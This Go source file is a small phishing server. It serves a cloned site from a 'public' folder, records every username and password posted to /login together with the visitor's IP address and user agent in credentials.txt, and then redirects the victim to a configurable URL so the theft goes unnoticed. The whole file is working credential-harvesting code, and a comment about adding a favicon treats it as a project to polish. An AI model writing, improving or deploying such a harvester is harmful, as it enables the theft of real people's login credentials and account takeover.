package main

// Another idea is to add a favicon? I'm not sure how I'd go about that. Also something to parse out the logs a bit nicer would be excellent.

import (
	"flag"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

var redirect_url string

func login(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("_user"),
		"password":   r.FormValue("_pass"),
		"useragent":  r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w, r, redirect_url, http.StatusFound)
}

func main() {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	r := mux.NewRouter()

	flag.StringVar(&redirect_url, "url", "/", "The URL to redirect to after a login attempt. Default is '/'")
	flag.Parse()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8000", r))
}
